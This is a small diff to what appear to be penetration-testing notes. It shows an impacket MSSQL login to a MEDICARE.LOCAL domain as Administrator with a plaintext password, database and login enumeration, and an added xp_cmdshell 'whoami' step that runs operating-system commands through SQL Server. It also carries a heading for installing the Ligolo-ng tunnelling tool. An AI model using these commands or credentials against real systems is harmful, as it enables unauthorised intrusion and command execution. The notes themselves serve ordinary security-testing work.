@@ -77,6 +77,8 @@ impacket-mssqlclient -windows-auth MEDICARE.LOCAL/Administrator:"admin123;"@medi
 
 enum_db
 enum_logins
+SELECT name FROM sys.databases;
+EXEC xp_cmdshell 'whoami'
 
 ## Install Ligolo-ng
 
